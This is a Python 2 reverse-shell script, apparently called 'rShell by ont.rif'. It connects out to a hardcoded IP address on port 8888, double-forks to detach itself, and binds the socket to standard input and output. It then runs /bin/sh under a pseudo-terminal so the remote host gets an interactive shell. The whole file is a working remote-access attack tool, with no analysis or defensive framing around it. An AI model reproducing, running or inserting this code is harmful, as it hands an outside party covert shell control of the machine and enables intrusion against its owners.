#!/usr/bin/env python
import sys, socket, os
import pty, fcntl, struct, termios, select, resource

## TODO: using subprocess.Popen( [ 'name' ... ], executable = 'python' ) for exename changing...
host = '95.181.93.72'
port = 8888

try:
    sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM )
    sock.connect( (host, port) )
except:
    print "[!] Can't connect !\n"
    os._exit( 1 )

print "[x] OK ....\n"

try:
    if os.fork() > 0: os._exit( 0 )
    if os.fork() > 0: os._exit( 0 )
except OSError, error:
    print '[!] fork: %d (%s)\n' % ( error.errno, error.strerror )



os.dup2( sock.fileno(), sys.stdin.fileno()  )
os.dup2( sock.fileno(), sys.stdout.fileno() )
os.dup2( sock.fileno(), sys.stderr.fileno() )
sock.sendall( ('\r\n>>>>>>>>>>>>>>> rShell by ont.rif >>>>>>>>>>>>>>\r\n') )

print "[!] %s\r" % sys.version

pid, child_fd = pty.fork()
if not pid: # Child
    try:
        TIOCSWINSZ = getattr(termios, 'TIOCSWINSZ', -2146929561)
        if TIOCSWINSZ == 2148037735L:
            TIOCSWINSZ = -2146929561
        s = struct.pack('HHHH', 36, 111, 0, 0)      ## terminal size = 111 x 36
        fcntl.ioctl( sys.stdout.fileno(), TIOCSWINSZ, s )
    except:
        pass

    # Do not allow child to inherit open file descriptors from parent.
    max_fd = resource.getrlimit(resource.RLIMIT_NOFILE)[0]
    for i in range( 3, max_fd ):
        try:
            os.close (i)
        except OSError:
            pass

    os.execv( '/bin/sh', [''] )


while True:
    r, w, e = select.select( [ child_fd, sock.fileno() ], [], [], 5 )

    if child_fd in r:
        try:
            res = os.read( child_fd, 100000 )
            os.write( sock.fileno(), res )
        except:
            print "[!] Die (child time out)......\r"
            os._exit( 0 )

    if sock.fileno() in r:
        res = os.read( sock.fileno(), 1000 )
        os.write( child_fd, res )
        if not res:
            print "[!] Die (empty socket)....\r"
            os._exit( 0 )

